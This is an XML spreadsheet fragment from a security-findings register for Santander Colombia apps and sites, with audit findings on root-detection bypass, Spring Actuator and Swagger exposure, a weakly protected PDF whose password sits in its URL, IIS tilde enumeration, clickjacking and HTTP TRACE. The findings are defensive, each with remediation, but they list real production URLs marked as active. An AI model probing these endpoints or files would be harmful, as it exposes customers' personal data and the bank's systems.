    <s v="APP Santander Token (Android)"/>
    <m/>
    <m/>
    <d v="2026-04-27T00:00:00"/>
    <n v="57"/>
    <d v="2026-07-26T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación móvil implementa mecanismos de seguridad en el lado del cliente para detectar si se está ejecutando en un dispositivo &quot;rooteado&quot; o comprometido. Sin embargo, estosmecanismos resultan insuficientes o carentes de la ofuscación adecuada, lo que permitiría evadirlos utilizando herramientas de instrumentación dinámica. La aplicación comprueba específicamente indicadores comunes de root, como binarios su, Magisk, SuperSU y ciertas banderas de compilación. Un usuario malintencionado podría capturar (hook) estas funciones específicas (tales como File.exists(), Runtime.exec(), SystemProperties y PackageManager) en tiempo de ejecución para devolver falsos negativos, engañando a la aplicación para que asuma que el entorno es completamente seguro."/>
    <s v="Implementar comprobaciones del entorno de múltiples capas y fuertemente ofuscadas. En _x000a_lugar de depender únicamente de comprobaciones estándar de la API a nivel de Java, se _x000a_recomienda incorporar validaciones nativas en C/C++, realizar comprobaciones de _x000a_integridad del espacio de memoria de la aplicación y utilizar mecanismos respaldados por _x000a_hardware, como la API de Google Play Integrity."/>
    <s v="Al evadir estas protecciones, un usuario malintencionado podría ejecutar la aplicación en un _x000a_entorno completamente controlado. Esto le facilitaría monitorizar la lógica interna del _x000a_software, extraer datos sensibles almacenados en memoria o almacenamiento local, y _x000a_manipular el comportamiento general. Como consecuencia, un usuario legítimo podría _x000a_exporner sus datos si su dispositivo fuera interceptado y las protecciones de la app fuesen _x000a_evadidas."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="616"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="APP"/>
    <m/>
    <m/>
    <s v="Santander Token Colombia"/>
    <m/>
    <s v="SC-26-CNMPO-014-AP-004"/>
    <x v="234"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="APP Santander Token (Android)"/>
    <m/>
    <m/>
    <d v="2026-04-27T00:00:00"/>
    <n v="57"/>
    <d v="2026-07-26T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación móvil está configurada con una versión mínima de SDK (minSdkVersion) _x000a_desactualizada. Los sistemas operativos Android por debajo de la versión mínima recomendada ya no reciben parches de seguridad oficiales. Al permitir la instalación en estos sistemas obsoletos, la aplicación queda expuesta a vulnerabilidades subyacentes del propio sistemaoperativo. Las características de seguridad modernas introducidas en versiones más recientes de Android, como protecciones de memoria mejoradas y restricciones estrictas sobre rocesos en segundo plano, podrían no estar disponibles en los dispositivos afectados."/>
    <s v="Se recomienda actualizar la configuración de la aplicación para requerir una versión mínima _x000a_de SDK más reciente. Se aconseja establecer el valor de minSdkVersion en al menos 28 _x000a_(Android 9) o superior, garantizando que la aplicación solo pueda ejecutarse en dispositivos _x000a_que aún reciben actualizaciones de seguridad periódicas y se benefician de la arquitectura de _x000a_seguridad moderna de Android."/>
    <s v="Las vulnerabilidades conocidas y públicamente divulgadas presentes en el sistema operativo _x000a_desactualizado podrían ser aprovechadas para comprometer el entorno de la aplicación. _x000a_Esto podría derivar en acceso no autorizado a los datos sensibles almacenados localmente. _x000a_Además, los dispositivos que ejecutan software sin parchear son más susceptibles a la _x000a_presencia de malware, que podría monitorizar o manipular el comportamiento de la aplicación."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="617"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="APP"/>
    <m/>
    <m/>
    <s v="Santander Token Colombia"/>
    <m/>
    <s v="SC-26-CNMPO-014-AP-005"/>
    <x v="235"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="APP Santander Token (Android)"/>
    <m/>
    <m/>
    <d v="2026-04-27T00:00:00"/>
    <n v="57"/>
    <d v="2026-08-25T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación expone de manera visible la tecnología subyacente y la versión exacta de su servidor web. Cuando se procesa una petición con un método HTTP no soportado por elentorno, como por ejemplo DEBUG, el sistema desencadena un error devolviendo un código de estado 501 Not Implemented. La plantilla de error devuelta por defecto incorpora la huella digital del software, evidenciando claramente la ejecución de Apache Tomcat/8.5.13."/>
    <s v="Configurar el servidor web para omitir la información de la versión y el tipo de tecnología en _x000a_las páginas de error y en las cabeceras HTTP. En el caso de Apache Tomcat, esto implica _x000a_modificar el atributo serverInfo en el archivo ServerInfo.properties ubicado dentro de catalina.jar, o implementar un ErrorReportValve personalizado para reemplazar las páginas _x000a_de error por defecto por pantallas completamente genéricas."/>
    <s v="Un usuario malintencionado podría utilizar esta información sobre el tipo y la versión del _x000a_servidor para buscar exploits públicos conocidos o vulnerabilidades asociadas con dicha _x000a_versión específica. Esto reduce significativamente el esfuerzo necesario para perfilar el sistema, _x000a_lo que podría derivar en un compromiso de la infraestructura, afectando la seguridad del _x000a_entorno para el usuario legítimo."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="618"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Información"/>
    <m/>
    <s v="SC-26-CNMPO-009-AP-003 "/>
    <x v="236"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="https://44539823.fs1.hubspotusercontent_x0002_na1.net/hubfs/44539823/extractos/1077034607/830000030959-2026-04-7564805910.pdf"/>
    <m/>
    <m/>
    <d v="2026-04-30T00:00:00"/>
    <n v="54"/>
    <d v="2026-08-28T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad se produce cuando un fichero PDF que contiene datos personales es protegido _x000a_mediante un mecanismo de seguridad débil e inadecuado. En este caso, el documento está _x000a_protegido con una contraseña de únicamente cuatro dígitos, lo que supone un espacio de búsqueda _x000a_extremadamente reducido y fácilmente explotable mediante ataques automatizados._x000a_Adicionalmente, la contraseña de protección se encuentra expuesta de forma indirecta en la propia _x000a_URL de descarga del fichero, ya que forma parte de la misma. Esto implica que cualquier usuario con _x000a_acceso a la URL puede obtener la clave sin necesidad de realizar ningún tipo de ataque, anulando _x000a_completamente la eficacia del mecanismo de protección implementado._x000a_Esta combinación de debilidades convierte la protección del fichero en meramente simbólica, _x000a_permitiendo el acceso no autorizado a información sensible contenida en el documento."/>
    <s v="Se recomienda eliminar el uso de contraseñas débiles como único mecanismo de protección para _x000a_ficheros que contienen información sensible. En su lugar, se deben implementar controles de _x000a_acceso robustos a nivel de aplicación, asegurando que únicamente usuarios autenticados y _x000a_autorizados puedan acceder a los documentos_x000a_Asimismo, nunca se debe incluir información sensible, como contraseñas o tokens de acceso, _x000a_dentro de la URL. En su lugar, se deben utilizar mecanismos seguros de gestión de sesiones o _x000a_enlaces temporales firmados con expiración._x000a_En caso de requerir protección adicional del fichero, se deben emplear contraseñas robustas con _x000a_suficiente entropía o mecanismos de cifrado fuerte, aunque siempre como complemento a _x000a_controles de acceso adecuados."/>
    <s v="El riesgo asociado es alto, ya que la vulnerabilidad afecta directamente a la confidencialidad de datos _x000a_personales. La exposición de la contraseña en la URL elimina cualquier barrera de protección, _x000a_permitiendo el acceso inmediato al contenido del fichero por parte de terceros no autorizados._x000a_Incluso en ausencia de dicha exposición, el uso de una contraseña de cuatro dígitos hace que el _x000a_fichero sea vulnerable a ataques de fuerza bruta que pueden ser ejecutados en muy poco tiempo _x000a_con herramientas automatizadas, debido al reducido número de combinaciones posibles._x000a_La explotación de esta vulnerabilidad podría derivar en la divulgación de información sensible, _x000a_incumplimientos normativos en materia de protección de datos y posibles impactos legales y _x000a_reputacionales para la organización."/>
    <m/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="619"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Información"/>
    <m/>
    <s v="SC-26-CNMPO-009-AP-004"/>
    <x v="237"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="http://servicios.santander.com.co/custome_x000a_r/v1/actuator_x000a_http://servicios.santander.com.co/account/_x000a_v1/actuator"/>
    <m/>
    <m/>
    <d v="2026-04-30T00:00:00"/>
    <n v="54"/>
    <d v="2026-07-29T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha identificado una vulnerabilidad de divulgación de información, que consiste en la exposición _x000a_pública de la documentación de la Interfaz de Programación de Aplicaciones (API) mediante el _x000a_esquema OpenAPI/Swagger. Esta documentación, accesible sin necesidad de autenticación, revela _x000a_de manera exhaustiva la estructura interna de la API, listando todos los endpoints disponibles, los _x000a_parámetros obligatorios y opcionales que aceptan, así como el formato de los datos que esperan y _x000a_devuelven. Como prueba de concepto, se demostró que cualquier atacante puede mapear por _x000a_completo la superficie de ataque de la API, sin necesidad de interactuar previamente con la _x000a_aplicación, lo que facilita enormemente la planificación de ataques subsecuentes y la búsqueda de _x000a_lógica de negocio defectuosa."/>
    <s v="Se debe proteger el acceso a la documentación de la API mediante autenticación, limitando el _x000a_acceso a los equipos de desarrollo y a usuarios autorizados. En entornos de producción se debe _x000a_considerar deshabilitar completamente la documentación interactiva (Swagger UI). Se debe revisar _x000a_que la documentación no incluya ejemplos con credenciales reales o tokens de acceso"/>
    <s v="Un atacante puede usar la documentación de la API expuesta para identificar rápidamente todos los _x000a_endpoints disponibles, los parámetros aceptados, los modelos de datos y las operaciones posibles, _x000a_reduciendo significativamente el tiempo necesario para la fase de reconocimiento. Esta información _x000a_facilita la identificación de endpoints vulnerables y la construcción de payloads de ataque precisos"/>
    <m/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="620"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Información"/>
    <m/>
    <s v="SC-26-CNMPO-009-CO-005"/>
    <x v="238"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="http://servicios.santander.com.co/custome_x000a_r/v1/actuator_x000a_http://servicios.santander.com.co/account/_x000a_v1/actuator"/>
    <m/>
    <m/>
    <d v="2026-04-30T00:00:00"/>
    <n v="54"/>
    <d v="2026-07-29T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Spring Boot Actuator expone una serie de endpoints de gestión y monitorización, entre ellos _x000a_/actuator/info, que puede revelar información sensible sobre la aplicación si no está correctamente _x000a_restringido. Este endpoint puede devolver datos como la versión de la aplicación, metadatos de _x000a_compilación, información del repositorio Git (rama, commit hash, autor), propiedades _x000a_personalizadas inyectadas desde application.properties o variables de entorno, y detalles sobre el _x000a_entorno de ejecución."/>
    <s v="Se recomienda restringir el acceso a todos los endpoints de Spring Boot Actuator mediante Spring _x000a_Security, permitiendo únicamente el acceso a usuarios autenticados y autorizados con roles _x000a_específicos (por ejemplo, ROLE_ADMIN), configurando adecuadamente _x000a_management.endpoints.web.exposure.include para exponer únicamente los endpoints _x000a_estrictamente necesarios y nunca exponiendo /actuator/info de forma pública en entornos de _x000a_producción."/>
    <s v="La información expuesta a través de /actuator/info puede ser aprovechada por un atacante en fases _x000a_de reconocimiento para construir un perfil detallado de la aplicación objetivo. Conocer la versión _x000a_exacta del framework, dependencias o el hash de commit permite identificar versiones vulnerables, _x000a_buscar CVEs aplicables y planificar ataques dirigidos con mayor precisión. Si el endpoint expone _x000a_propiedades de configuración personalizadas —como URLs de servicios internos, nombres de _x000a_entornos, identificadores de infraestructura o flags de funcionalidades—, el atacante puede obtener _x000a_información suficiente para pivotar hacia otros sistemas internos o ajustar sus técnicas de _x000a_explotación al entorno real de producción."/>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2">
  <r>
    <n v="1"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="BPM"/>
    <s v="QA-WAS-3ad0c84a-5c49-4f65-af27-c8e2f4ab8054"/>
    <m/>
    <x v="0"/>
    <m/>
    <x v="0"/>
    <s v="High"/>
    <n v="7.5"/>
    <m/>
    <m/>
    <s v="https://bpm.santanderconsumer.co/*~1*/a.aspx"/>
    <m/>
    <m/>
    <d v="2024-08-17T00:00:00"/>
    <n v="675"/>
    <d v="2024-09-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-09-21T00:00:00"/>
    <s v="La vulnerabilidad de divulgación de información del carácter tilde en Microsoft IIS (Internet Information Services) es un problema de seguridad que puede explotarse para divulgar información confidencial sobre la estructura del sistema de archivos de un servidor web._x000a_La vulnerabilidad está relacionada con la forma en que IIS maneja las solicitudes que contienen el carácter tilde (~). En ciertas configuraciones de IIS, un atacante puede aprovechar esta vulnerabilidad para enumerar archivos y directorios en el servidor, incluso si no son accesibles directamente a través de la web. Esto se debe a la forma en que IIS trunca los nombres de archivo largos y utiliza el carácter tilde en los nombres de archivo abreviados resultantes."/>
    <s v="Para obtener más información sobre cómo abordar la vulnerabilidad, consulte el aviso de Microsoft._x000a__x000a_https://techcommunity.microsoft.com/t5/iis-support-blog/iis-short-name-enumeration/ba-p/3951320"/>
    <s v="Al crear solicitudes específicas que contengan el carácter tilde '~', un atacante podría aprovechar esta vulnerabilidad en el servidor web. Si hay directorios o archivos presentes, el atacante podría obtener acceso a ellos. El acceso al contenido podría dar como resultado la revelación de información confidencial al atacante."/>
    <m/>
    <m/>
    <s v="Jenny Rodriguez_x000a_Alexander Parra"/>
  </r>
  <r>
    <n v="2"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="QA-WAS-8248f442-8024-4e19-8e51-745d978c3b54"/>
    <m/>
    <x v="1"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://autofinance.santanderfinancing.com/vehicle/test.aspx"/>
    <m/>
    <m/>
    <d v="2023-05-27T00:00:00"/>
    <n v="1123"/>
    <d v="2023-08-25T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-01-25T00:00:00"/>
    <s v="Se descubrió un archivo, directorio o listado de directorios en el servidor web. Según nuestra lógica, se ha confirmado la presencia de estos recursos. Parte del contenido de estos archivos podría contener información confidencial."/>
    <s v="Se recomienda revisar el contenido de los archivos divulgados. Si el contenido contiene información confidencial, verifique que se permita el acceso a ese archivo o directorio. De ser necesario, elimínelo o aplique controles de acceso al mismo."/>
    <s v="El contenido de este archivo o directorio puede revelar información confidencial."/>
    <s v="1° fecha 31/01/2025"/>
    <m/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="3"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Motor"/>
    <s v="QA-WAS-a11a2876-1459-40ce-95f4-b98b6b947d62"/>
    <m/>
    <x v="2"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="5.8"/>
    <m/>
    <m/>
    <s v="https://motor.santanderconsumer.co/"/>
    <m/>
    <m/>
    <d v="2024-08-04T00:00:00"/>
    <n v="688"/>
    <d v="2024-11-02T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-11-09T00:00:00"/>
    <s v="La página web puede estar enmarcada, lo que significa que es posible que se produzcan ataques de clickjacking contra los usuarios."/>
    <s v="Los mecanismos de prevención de clickjacking incluyen:_x000a_- X-Frame-Options: este encabezado de respuesta HTTP se puede utilizar para evitar el enmarcado de páginas web._x000a_- Content-Security-Policy: la directiva 'frame-ancestors' se puede utilizar para evitar el enmarcado de páginas web._x000a_- Código JavaScript Framekiller diseñado para evitar que un usuario malintencionado enmarque la página. Este método no se recomienda debido a su poca fiabilidad._x000a_Consulte la hoja de trucos de defensa contra el secuestro de clics de OWASP para obtener más información._x000a_Para evitar un error común de implementación de X-Frame-Options, consulte_x000a_https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger."/>
    <s v="Con el clickjacking, un atacante puede engañar a un usuario víctima para que haga clic en un marco invisible en la página web, provocando así que la víctima realice una acción que no tenía intención de realizar."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="4"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Motor"/>
    <s v="QA-WAS-534acfb5-02d1-4014-b640-40e831a9197f"/>
    <m/>
    <x v="2"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="5.8"/>
    <m/>
    <m/>
    <s v="https://motor.santanderconsumer.co/?C=S%3BOA"/>
    <m/>
    <m/>
    <d v="2024-08-04T00:00:00"/>
    <n v="688"/>
    <d v="2024-11-02T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-11-09T00:00:00"/>
    <s v="La página web puede estar enmarcada, lo que significa que es posible que se produzcan ataques de clickjacking contra los usuarios."/>
    <s v="Los mecanismos de prevención de clickjacking incluyen:_x000a_- X-Frame-Options: este encabezado de respuesta HTTP se puede utilizar para evitar el enmarcado de páginas web._x000a_- Content-Security-Policy: la directiva 'frame-ancestors' se puede utilizar para evitar el enmarcado de páginas web._x000a_- Código JavaScript Framekiller diseñado para evitar que un usuario malintencionado enmarque la página. Este método no se recomienda debido a su poca fiabilidad._x000a_Consulte la hoja de trucos de defensa contra el secuestro de clics de OWASP para obtener más información._x000a_Para evitar un error común de implementación de X-Frame-Options, consulte_x000a_https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger."/>
    <s v="Con el clickjacking, un atacante puede engañar a un usuario víctima para que haga clic en un marco invisible en la página web, provocando así que la víctima realice una acción que no tenía intención de realizar."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="5"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-820a6769-6dde-4ef7-a393-f411bdeb2412"/>
    <m/>
    <x v="1"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/plugins/divi-machine/ChangeLog"/>
    <m/>
    <m/>
    <d v="2024-06-23T00:00:00"/>
    <n v="730"/>
    <d v="2024-09-21T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-10-26T00:00:00"/>
    <s v="Se descubrió un archivo, directorio o listado de directorios en el servidor web. Según nuestra lógica, se ha confirmado la presencia de estos recursos. Parte del contenido de estos archivos podría contener información confidencial."/>
    <s v="Se recomienda revisar el contenido de los archivos divulgados. Si el contenido contiene información confidencial, verifique que se permita el acceso a ese archivo o directorio. De ser necesario, elimínelo o aplique controles de acceso al mismo."/>
    <s v="El contenido de este archivo o directorio puede revelar información confidencial."/>
    <m/>
    <m/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="6"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-2832357a-28aa-45c4-a5fa-d8a74dab7a50"/>
    <m/>
    <x v="1"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/plugins/divi-machine/includes/modules/divi-ajax-filter/includes/modules/MachineLoop/../../../ChangeLog"/>
    <m/>
    <m/>
    <d v="2024-06-23T00:00:00"/>
    <n v="730"/>
    <d v="2024-09-21T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-10-26T00:00:00"/>
    <s v="Se descubrió un archivo, directorio o listado de directorios en el servidor web. Según nuestra lógica, se ha confirmado la presencia de estos recursos. Parte del contenido de estos archivos podría contener información confidencial."/>
    <s v="Se recomienda revisar el contenido de los archivos divulgados. Si el contenido contiene información confidencial, verifique que se permita el acceso a ese archivo o directorio. De ser necesario, elimínelo o aplique controles de acceso al mismo."/>
    <s v="El contenido de este archivo o directorio puede revelar información confidencial."/>
    <m/>
    <m/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="7"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-68052413-3771-42c8-a20d-8327d7b06e32"/>
    <m/>
    <x v="1"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/plugins/popups-for-divi/CHANGELOG.txt"/>
    <m/>
    <m/>
    <d v="2024-06-23T00:00:00"/>
    <n v="730"/>
    <d v="2024-09-21T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-01-18T00:00:00"/>
    <s v="Se descubrió un archivo, directorio o listado de directorios en el servidor web. Según nuestra lógica, se ha confirmado la presencia de estos recursos. Parte del contenido de estos archivos podría contener información confidencial."/>
    <s v="Se recomienda revisar el contenido de los archivos divulgados. Si el contenido contiene información confidencial, verifique que se permita el acceso a ese archivo o directorio. De ser necesario, elimínelo o aplique controles de acceso al mismo."/>
    <s v="El contenido de este archivo o directorio puede revelar información confidencial."/>
    <m/>
    <m/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="8"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-a3f1481d-e7b1-457e-81c3-0d0cba90afed"/>
    <m/>
    <x v="1"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi/ChangeLog.txt"/>
    <m/>
    <m/>
    <d v="2024-06-23T00:00:00"/>
    <n v="730"/>
    <d v="2024-09-21T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-01-18T00:00:00"/>
    <s v="Se descubrió un archivo, directorio o listado de directorios en el servidor web. Según nuestra lógica, se ha confirmado la presencia de estos recursos. Parte del contenido de estos archivos podría contener información confidencial."/>
    <s v="Se recomienda revisar el contenido de los archivos divulgados. Si el contenido contiene información confidencial, verifique que se permita el acceso a ese archivo o directorio. De ser necesario, elimínelo o aplique controles de acceso al mismo."/>
    <s v="El contenido de este archivo o directorio puede revelar información confidencial."/>
    <m/>
    <m/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="9"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Motor"/>
    <s v="QA-VM-3440952502986906853"/>
    <m/>
    <x v="3"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5.8"/>
    <m/>
    <m/>
    <s v="motor.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-02-10T00:00:00"/>
    <n v="864"/>
    <d v="2024-05-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado un servidor Web compatible con el método HTTP TRACE. Este método permite la depuración y el análisis del rastreo de conexiones desde el cliente al servidor Web. Según la especificación HTTP, cuando se utiliza este método, el servidor Web devuelve la información enviada por el cliente sin modificar y sin filtrar. El servidor web Microsoft IIS utiliza un alias TRACK para este método, y es funcionalmente el mismo._x000a__x000a_Se ha descubierto una vulnerabilidad relacionada con este método. Un componente malicioso activo en una página Web puede enviar peticiones de Rastreo a un servidor Web que soporte este método de Rastreo. Normalmente, la seguridad del navegador impide el acceso a sitios Web fuera del dominio del sitio actual. Aunque es poco probable y difícil de lograr, es posible, en presencia de otras vulnerabilidades del navegador, que el contenido HTML activo haga peticiones externas a servidores Web arbitrarios más allá del servidor Web anfitrión. Dado que el servidor Web elegido devuelve la solicitud del cliente sin filtrar, la respuesta también incluye credenciales de autenticación basadas en cookies o en la Web (si se ha iniciado sesión) que el navegador envió automáticamente a la aplicación Web especificada en el servidor Web especificado. _x000a__x000a_La importancia de la capacidad de rastreo en esta vulnerabilidad es que el componente activo en la página visitada por el usuario víctima no tiene acceso directo a esta información de autenticación, sino que la obtiene después de que el servidor Web de destino se haga eco de ella como respuesta de rastreo. _x000a__x000a_Dado que esta vulnerabilidad existe como soporte de un método requerido por la especificación del protocolo HTTP, los servidores Web más comunes son vulnerables._x000a__x000a_Los métodos exactos soportados, Trace y/o Track, y sus respuestas se encuentran en la sección Resultados más abajo._x000a__x000a_Track / Trace deben estar desactivados para cumplir con la normativa PCI."/>
    <s v="A continuación se ofrecen soluciones para algunos de los servidores Web más comunes. Para otros servidores Web, consulte la documentación de su proveedor._x000a__x000a_Apache: Las versiones recientes de Apache disponen de un módulo Rewrite que permite reescribir las peticiones HTTP o gestionarlas de una forma específica. Compile el servidor Apache con el módulo mod_rewrite. Es posible que tenga que descomentar las directivas «AddModule» y «LoadModule» en el archivo de configuración httpd.conf. Añada las siguientes líneas para cada virtualhost en su archivo de configuración (Tenga en cuenta que, por defecto, las configuraciones de reescritura no se heredan. Esto significa que necesita tener directivas Rewrite para cada host virtual en el que desee utilizarlo):_x000a__x000a_&lt;IfModule mod_rewrite.c&gt;_x000a_RewriteEngine on_x000a_RewriteCond %{REQUEST_METHOD} ^TRACE_x000a_RewriteRule .* - [F]_x000a_&lt;/IfModule&gt;_x000a__x000a_Con esta configuración, Apache captura todas las peticiones TRACE, y responde con una página informando de que la petición está prohibida. No se devuelve ningún contenido de la petición original._x000a__x000a_Una solución un poco más estricta es usar_x000a__x000a_&lt;IfModule mod_rewrite.c&gt;_x000a_RewriteEngine on_x000a_RewriteCond %{REQUEST_METHOD} !^(GET|POST|HEAD)$_x000a_RewriteRule .* - [F]_x000a_&lt;/IfModule&gt;_x000a__x000a_Tenga en cuenta que RewriteEngine puede consumir mucho procesador y puede afectar al rendimiento del servidor web. El método de rastreo también puede controlarse mediante la directiva TraceEnable._x000a_En el httpd.conf añada o modifique:_x000a__x000a_TraceEnable Off_x000a__x000a__x000a_Microsoft IIS: Microsoft ha lanzado URLScan, que puede utilizarse para filtrar todas las solicitudes entrantes basándose en reglas personalizadas. URLScan puede utilizarse para desinfectar o deshabilitar las solicitudes TRACE de los clientes. Tenga en cuenta que IIS cambia 'TRACK' por 'TRACE'. Por lo tanto, si URLScan se utiliza para bloquear específicamente el método TRACE, el método TRACK también debe añadirse al filtro._x000a__x000a_URLScan utiliza el fichero de configuración 'urlscan.ini', normalmente en el directorio \System32\InetSrv\URLScan. En él, tenemos dos secciones - AllowVerbs y DenyVerbs. La primera se usa si la variable UseAllowVerbs está a 1, de lo contrario (si está a 0), se usan las DenyVerbs. Claramente, cualquiera de los dos puede ser usado, dependiendo de si queremos una política Default-Deny-Explicit-Allow o una Default-Allow-Explicit-Deny. Para desautorizar los métodos TRACE y TRACK a través de URLScan, primero elimine los métodos 'TRACK', 'TRACE' de la sección 'AllowVerbs' y añádalos a la sección 'DenyVerbs'. Con esto, URLScan desautorizará todos los métodos 'TRACE' y 'TRACK', y generará una página de error para todas las peticiones que utilicen ese método. Para activar los cambios, reinicie el 'World Wide Web Publishing Service' desde la opción 'Servicios' del Panel de Control._x000a_Para más detalles sobre otros servidores web: Cert Advisory."/>
    <m/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="10"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Motor"/>
    <s v="QA-VM--8691741700771998703"/>
    <m/>
    <x v="4"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5.8"/>
    <m/>
    <m/>
    <s v="motor.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-02-10T00:00:00"/>
    <n v="864"/>
    <d v="2024-05-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor Web remoto admite los métodos HTTP TRACE y/o TRACK, lo que facilita a los atacantes remotos robar cookies y credenciales de autenticación o eludir el mecanismo de protección HttpOnly._x000a__x000a_Es necesario desactivar Track / Trace para cumplir con la normativa PCI."/>
    <s v="Desactive estos métodos en el archivo de configuración de su servidor web."/>
    <m/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="11"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Motor"/>
    <s v="QA-VM--2097320269514817275"/>
    <m/>
    <x v="5"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5"/>
    <m/>
    <m/>
    <s v="motor.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-02-10T00:00:00"/>
    <n v="864"/>
    <d v="2024-05-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
